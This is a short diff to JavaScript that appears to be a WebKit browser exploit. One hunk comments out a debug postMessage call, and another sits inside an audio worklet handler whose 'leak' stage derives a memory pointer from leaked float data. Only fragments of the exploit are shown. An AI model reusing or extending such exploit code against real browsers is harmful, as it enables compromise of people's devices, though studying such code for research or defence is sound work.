@@ -360,7 +360,7 @@ function iv(x){
 }
 // That's all the arithmetic we need for exploiting WebKit.. :)
 
-fuck.port.postMessage("starting");
+//fuck.port.postMessage("starting");
 
 function dec2hex(n) {
         if(n < 0) {
@@ -603,6 +603,7 @@ for(var i = 0; i < 0x10000; i++){
 `);
 b.process = (inputs, outputs, parameters)=>{
     //sa
+    //fuck.port.postMessage("starting");
     if(stage == "leak"){
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
